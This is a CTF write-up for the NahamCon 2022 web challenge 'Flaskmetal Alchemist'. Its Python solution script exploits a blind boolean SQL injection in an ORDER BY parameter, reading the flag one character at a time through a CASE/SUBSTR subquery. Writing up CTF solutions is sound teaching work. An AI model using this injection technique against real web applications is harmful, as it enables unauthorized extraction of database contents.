---
name: Flaskmetal Alchemist (2022)
event: NahamCon CTF 2022
category: Web
description: Writeup for Flaskmetal Alchemist (Web) - NahamCon CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Flaskmetal Alchemist

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/ttsFRYkL8wQ/0.jpg)](https://youtu.be/ttsFRYkL8wQ?t=705 "NahamCon CTF 2022: Flaskmetal Alchemist")

## Description

> Edward has decided to get into web development, and he built this awesome application that lets you search for any metal you want. Alphonse has some reservations though, so he wants you to check it out and make sure it's legit.

## Solution

{% code overflow="wrap" %}
```py
import requests
import string
from bs4 import BeautifulSoup

url = 'http://challenge.nahamcon.com:30010/'
flag = 'flag{'
index = 6

# Until we've got the whole flag
while flag[-1] != '}':
    for char in list('_' + string.ascii_lowercase + '}'):  # Charset
        # Post data, orderby is the SQLi (blind boolean)
        data = {"search": "",
                "order": f"(CASE WHEN (SELECT (SUBSTR(flag, {index}, 1)) from flag ) = '{char}' THEN name ELSE atomic_number END) DESC--"}

        response = requests.post(url, data=data)
        # Extract the first value
        extracted = BeautifulSoup(response.text, features="lxml").td.contents[0]

        # If it's 116 (Livermorium) then condition is false
        if extracted != '116':
            flag += char
            print(flag)
            index += 1
            break
```
{% endcode %}
